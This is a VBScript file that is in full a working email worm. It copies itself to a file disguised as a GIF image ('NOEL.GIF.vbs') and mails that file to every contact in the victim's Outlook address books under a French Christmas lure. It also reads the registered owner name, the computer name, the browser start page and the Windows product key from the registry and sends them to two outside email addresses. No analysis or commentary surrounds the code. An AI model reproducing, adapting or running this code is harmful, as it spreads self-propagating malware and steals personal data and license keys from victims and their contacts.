Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)
Set c    = fso.GetFile(WScript.ScriptFullName)
c.Copy("C:\NOEL.GIF.vbs")
EMAIL()
End Sub

Sub EMAIL()
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "JOUYEUX NOEL"
msg.Body = "Voici une photodu PERE NOEL"
msg.Attachments.Add ("C:\NOEL.GIF.vbs")
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End if
Set msg2 = OApp.CreateItem(0)
msg2.BCC = "Panda34@caramail.com; Pif878@aol.com"
nom = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
CN = CreateObject("WScript.NetWork").ComputerName
msg2.Subject = "Message de """ & nom & """ alias " & CN & ""
page = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
PK = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\ProductKey")
msg2.Body = "-IE :  """ & page & """ -Produkt Key """ & PK & """"
msg2.Send
End Sub
